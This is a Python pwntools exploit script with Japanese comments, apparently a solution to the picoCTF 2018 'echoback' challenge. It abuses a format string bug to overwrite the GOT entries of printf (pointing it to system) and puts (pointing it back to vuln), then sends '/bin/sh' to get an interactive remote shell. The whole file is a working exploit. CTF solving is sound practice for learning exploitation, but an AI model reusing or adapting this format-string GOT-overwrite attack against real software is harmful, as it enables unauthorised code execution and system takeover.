# coding: utf-8

# fsbのバグがある
# 一度目の書き込みで、printfのgotをsystemに、putsのgotをvulnに書き換える
# putsをvulnに書き換えたことでもう一度vulnが実行され、read時に/bin/shを入れる
# printfがsystemに書き換えられているので/bin/shを引数にして、systemが実行される


from pwn import *

def send_payload(payload):
    log.info("payload = %s" % repr(payload))
    p.sendline(payload)
    return p.recv(1048)


e = ELF('./echoback')

host = '2018shell3.picoctf.com'
port = 26532
# p = process('./echoback')
p = remote(host, port)

vuln = 0x080485ab
puts_argument_addr = 0x0804873c
fmt_offset = 7
printf_got = e.got['printf']
puts_got = e.got['puts']
system_plt = e.plt['system']

# printf -> system
# puts -> vuln
fmtstr = FmtStr(execute_fmt=send_payload, offset=fmt_offset, numbwritten=0)
fmtstr.write(printf_got, system_plt)
fmtstr.write(puts_got, vuln)
fmtstr.execute_writes()

# when read input /bin/sh
# printf('/bin/sh') -> system('/bin/sh')
p.sendline('/bin/sh')

p.interactive()
